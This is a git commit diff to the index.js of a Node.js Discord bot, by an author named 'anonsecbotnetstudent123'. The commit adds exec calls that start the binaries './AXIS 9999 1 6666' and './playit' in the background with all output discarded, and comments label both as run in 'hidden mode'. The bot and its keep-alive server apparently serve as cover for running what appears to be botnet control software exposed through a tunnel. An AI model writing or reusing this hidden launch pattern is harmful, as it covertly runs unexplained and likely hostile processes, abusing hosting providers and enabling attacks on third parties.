f7f2375be97d5d1fd1a191f01575802a30b68b1c
anonsecbotnetstudent123 <124842614+anonsecbotnetstudent123@users.noreply.github.com>
2023-05-17 07:08:24 -0700

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,31 @@
+const { exec } = require("child_process");
 const Eris = require("eris");
 const keepAlive = require("./server");
+
 keepAlive();
 
-const bot = new Eris("TOKEN");
+const bot = new Eris("YOUR_BOT_TOKEN"); // Thay "YOUR_BOT_TOKEN" bằng mã token thực tế của bot
+
+bot.on("ready", () => {
+  console.log("Discord bot is ready!");
+
+  // Chạy lệnh AXIS ở chế độ ngầm
+  exec("./AXIS 9999 1 6666 > /dev/null 2>&1 &", (error, stdout, stderr) => {
+    if (error) {
+      console.error("Error running AXIS:", error);
+    }
+  });
+
+  console.log("AXIS command started in hidden mode");
+
+  // Chạy lệnh playit ở chế độ ngầm
+  exec("./playit > /dev/null 2>&1 &", (error, stdout, stderr) => {
+    if (error) {
+      console.error("Error running playit:", error);
+    }
+  });
+
+  console.log("playit command started in hidden mode");
+});
 
 bot.connect();
